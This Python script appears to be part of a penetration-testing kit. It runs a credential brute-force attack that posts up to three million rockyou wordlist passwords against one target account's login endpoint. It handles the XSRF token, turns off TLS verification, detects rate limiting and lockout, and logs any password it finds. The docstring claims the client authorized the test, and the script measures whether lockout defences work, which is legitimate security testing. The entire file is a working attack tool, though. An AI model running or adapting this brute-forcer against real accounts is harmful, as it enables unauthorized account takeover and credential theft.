"""
GLITCHICONS ⬡ — Heavy Brute Force
Client authorized: [REDACTED]
Test: 3M rockyou against single high-value target
"""

import requests
import time
import sys
from pathlib import Path
from datetime import datetime, timedelta
from rich.console import Console
from rich.panel import Panel

console = Console()

def brute_force_heavy(
    target="https://target.example.com",
    email="target@example.com",
    password_file=None,
    delay=1.0,
    max_minutes=60,
    output_dir=None
):
    login_url = f"{target}/login"
    login_page = f"{target}/app/login"
    start_time = datetime.now()
    deadline = start_time + timedelta(minutes=max_minutes)

    total_passwords = sum(1 for _ in open(password_file, encoding="utf-8", errors="ignore"))

    console.print(Panel(
        f"[bold red]⬡ GLITCHICONS HEAVY BRUTE FORCE[/bold red]\n"
        f"[dim]Target   : {login_url}[/dim]\n"
        f"[dim]Email    : {email}[/dim]\n"
        f"[dim]Wordlist : {total_passwords:,} passwords[/dim]\n"
        f"[dim]Delay    : {delay}s | Max duration: {max_minutes} min[/dim]\n"
        f"[dim]Started  : {start_time.strftime('%H:%M:%S')}[/dim]",
        border_style="red"
    ))

    # Stats tracking
    attempt = 0
    errors = 0
    lockout_at = None
    rate_limit_at = None
    status_counts = {}
    findings = []

    # Get initial session
    session = requests.Session()
    try:
        r = session.get(login_page, verify=False, timeout=15)
        xsrf = session.cookies.get("XSRF-TOKEN")
        if xsrf:
            from urllib.parse import unquote
            csrf = unquote(xsrf)
        else:
            csrf = ""
    except:
        csrf = ""

    with open(password_file, encoding="utf-8", errors="ignore") as f:
        for password in f:
            password = password.strip()
            if not password:
                continue

            # Check time limit
            if datetime.now() > deadline:
                console.print(f"\n[yellow]⏱ Time limit ({max_minutes} min) reached[/yellow]")
                break

            attempt += 1
            headers = {
                "Content-Type": "application/json",
                "Accept": "application/json",
                "X-XSRF-TOKEN": csrf,
                "Referer": login_page,
                "Origin": target,
            }

            try:
                r = session.post(
                    login_url,
                    json={"email": email, "password": password},
                    headers=headers,
                    verify=False,
                    timeout=15,
                    allow_redirects=False
                )
                status = r.status_code
                status_counts[status] = status_counts.get(status, 0) + 1

                # Detect lockout / rate limiting
                if status == 429:
                    rate_limit_at = attempt
                    console.print(f"\n[bold green]⬡ RATE LIMIT (429) at attempt {attempt}![/bold green]")
                    console.print(f"[green]  → Server defended after {attempt} attempts[/green]")
                    findings.append({"type": "RATE_LIMIT", "at_attempt": attempt, "password_tried": password})
                    break

                if status in [423, 503]:
                    lockout_at = attempt
                    console.print(f"\n[bold green]⬡ LOCKOUT ({status}) at attempt {attempt}![/bold green]")
                    findings.append({"type": "LOCKOUT", "at_attempt": attempt, "status": status})
                    break

                text_lower = r.text.lower()
                if any(x in text_lower for x in ["too many", "locked", "blocked", "throttle", "captcha"]):
                    lockout_at = attempt
                    console.print(f"\n[bold green]⬡ SOFT BLOCK detected at attempt {attempt}![/bold green]")
                    findings.append({"type": "SOFT_BLOCK", "at_attempt": attempt})
                    break

                # Success
                if status == 200 and "dashboard" in r.text.lower():
                    console.print(f"\n[bold red]⬡ LOGIN SUCCESS: {email}:{password}[/bold red]")
                    findings.append({"type": "CREDENTIAL_FOUND", "email": email, "password": password})
                    break

                # Progress report every 100 attempts
                if attempt % 100 == 0:
                    elapsed = (datetime.now() - start_time).seconds
                    rate = attempt / max(elapsed, 1) * 60
                    console.print(
                        f"  [dim]Attempt {attempt:,} | "
                        f"Status: {status} | "
                        f"Rate: {rate:.0f}/min | "
                        f"Elapsed: {elapsed//60}m{elapsed%60}s[/dim]"
                    )

            except Exception as e:
                errors += 1
                if errors % 10 == 0:
                    console.print(f"[dim red]  Errors: {errors}[/dim red]")
                # Refresh session on repeated errors
                if errors % 20 == 0:
                    session = requests.Session()
                time.sleep(delay)
                continue

            time.sleep(delay)

    # Final report
    elapsed_total = (datetime.now() - start_time).seconds
    console.print(f"\n[bold]⬡ HEAVY BRUTE FORCE COMPLETE[/bold]")
    console.print(f"  Total attempts : [bold]{attempt:,}[/bold]")
    console.print(f"  Duration       : {elapsed_total//60}m {elapsed_total%60}s")
    console.print(f"  Errors         : {errors}")
    console.print(f"  Status codes   : {status_counts}")
    console.print(f"  Rate limit at  : {rate_limit_at or 'NEVER TRIGGERED ⚠️'}")
    console.print(f"  Lockout at     : {lockout_at or 'NEVER TRIGGERED ⚠️'}")

    if not rate_limit_at and not lockout_at:
        console.print(f"\n[bold red]⚠  SERVER DID NOT DEFEND after {attempt:,} attempts[/bold red]")
        findings.append({
            "type": "NO_PROTECTION",
            "total_attempts": attempt,
            "duration_seconds": elapsed_total,
            "severity": "CRITICAL"
        })

    # Save report
    if output_dir:
        out = Path(output_dir)
        out.mkdir(parents=True, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        report = out / f"heavy_bruteforce_{ts}.md"
        lines = [
            f"# Heavy Brute Force Report",
            f"- Target   : {login_url}",
            f"- Email    : {email}",
            f"- Started  : {start_time}",
            f"- Attempts : {attempt:,}",
            f"- Duration : {elapsed_total//60}m {elapsed_total%60}s",
            f"- Errors   : {errors}",
            f"- Statuses : {status_counts}",
            f"- Rate limit triggered: {rate_limit_at or 'NO'}",
            f"- Lockout triggered   : {lockout_at or 'NO'}",
            "",
        ]
        for fn in findings:
            lines.append(f"## {fn['type']}")
            for k, v in fn.items():
                lines.append(f"- {k}: {v}")
            lines.append("")
        report.write_text("\n".join(lines))
        console.print(f"\n[dim]Report saved: {report}[/dim]")

    return findings


if __name__ == "__main__":
    import warnings
    warnings.filterwarnings("ignore")

    brute_force_heavy(
        target="https://target.example.com",
        email="target@example.com",
        password_file="wordlists/rockyou_3m.txt",
        delay=1.0,
        max_minutes=60,
        output_dir="engagements/ancient-wisdom/findings/bruteforce"
    )
